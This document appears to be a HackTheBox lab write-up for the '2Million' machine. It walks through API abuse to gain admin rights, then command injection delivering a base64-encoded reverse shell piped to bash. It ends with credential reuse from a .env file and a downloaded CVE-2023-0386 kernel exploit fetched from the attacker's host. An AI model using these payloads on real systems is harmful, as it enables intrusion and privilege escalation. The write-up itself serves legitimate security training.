# HackTheBox: 2Million Writeup

**Difficulty:** Easy \
**Machine IP:** 10.129.229.66

## 1. Enumeration

### Network Scanning

I started by connecting to the HTB VPN and scanning the target with `nmap`.

```bash
nmap -sS -sV 10.129.229.66

```

The scan revealed two open ports:

* **22/tcp (SSH):** OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
* **80/tcp (HTTP):** nginx

I added the domain `2million.htb` to my `/etc/hosts` file and visited the website.

### Web Reconnaissance

Poking around the site, I navigated to the login page but lacked credentials, so I attempted to sign up. The registration page required an invite code, with a teasing message to "feel free to hack in".

I inspected the page source and discovered a JavaScript file related to invite codes. The code was obfuscated, so I utilized **GPT-OSS** (a localhosted LLM model) to deobfuscate it and understand its logic. The LLM revealed the `verifyInviteCode` and `makeInviteCode` functions, pointing to an interesting endpoint: `/api/v1/invite/how/to/generate`.

## 2. Foothold

### Generating an Invite Code

I sent a POST request to the endpoint I found:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate

```

The response contained a hint encrypted with **ROT13**. Decrypting it revealed the instruction:

> "In order to generate the invite code, make a POST request to /api/v1/invite/generate"

Following the hint, I queried the generation endpoint:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate

```

This returned a base64 encoded string. Decoding it gave me a valid invite code:

```bash
echo "OFMzVE0tMVAxUDAtWVlSNkktVUc5RFE=" | base64 -d
# Result: 8S3TM-1P1P0-YYR6I-UG9DQ

```

### API Enumeration

With the invite code, I registered and logged in. I noticed a "Connection Pack" download button which triggered a GET request to `/api/v1/user/vpn/generate`.

Curious about the API structure, I visited `/api/v1` in the browser and discovered a list of endpoints, including several restricted **admin** routes:

* `GET /api/v1/admin/auth`
* `POST /api/v1/admin/vpn/generate`
* `PUT /api/v1/admin/settings/update`

## 3. Privilege Escalation (Admin)

### Bypassing Authorization

Initial attempts to hit admin endpoints resulted in `401 Unauthorized`. I bypassed this by including my session cookie (`PHPSESSID`) in the `curl` requests.

I targeted the settings update endpoint to elevate my privileges. The API was picky about the format, requiring the `Content-Type` to be `application/json` and specifically demanding an `email` and an `is_admin` parameter.

After some trial and error with data types (determining `is_admin` needed to be `1` rather than `true`), I successfully upgraded my user to an admin:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
--cookie "PHPSESSID=..." \
--header "Content-Type: application/json" \
--data '{"email":"a@a.com", "is_admin": 1}'

```

## 4. Exploitation (RCE)

Now an admin, I returned to the `/api/v1/admin/vpn/generate` endpoint. The API required a `username` parameter. I tested for command injection by appending `;whoami;` to the username, which successfully returned `www-data`.

### Reverse Shell

To stabilize access, I set up a `nc` listener and injected a base64-encoded reverse shell payload to avoid bad characters:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
--cookie "PHPSESSID=..." \
--header "Content-Type: application/json" \
--data '{"username": "a;echo YmFzaCAtaSA+Ji... | base64 -d | bash;"}'

```

## 5. System Privilege Escalation

### Lateral Movement

As `www-data`, I listed the directory contents and found a `.env` file containing database credentials:

* **DB_USERNAME:** `admin`
* **DB_PASSWORD:** `SuperDuperPass123`

I used these credentials to SSH into the box as the `admin` user and grabbed the user flag.

### Kernel Exploitation (CVE-2023-0386)

Checking the admin's mail (`/var/mail/admin`) revealed a message from "ch4p" warning about a serious "OverlayFS / FUSE" vulnerability.

I searched online for recent OverlayFS vulnerabilities matching the description and identified **CVE-2023-0386**. I utilized a **Google Dork** to locate a working Proof of Concept (PoC) script on GitHub.

I downloaded the exploit zip from [this GitHub repository](https://github.com/sxlmnwb/CVE-2023-0386), transferred it to the target machine using a Python HTTP server, and ran it:

```bash
# On target machine
wget http://10.10.15.45:8080/cve.zip
unzip cve.zip
cd CVE-2023-0386
./fuse ./ovlcap/lower ./gc &
./exp

```

The exploit succeeded, granting me a root shell (`uid=0`). I navigated to `/root` and captured the final flag.
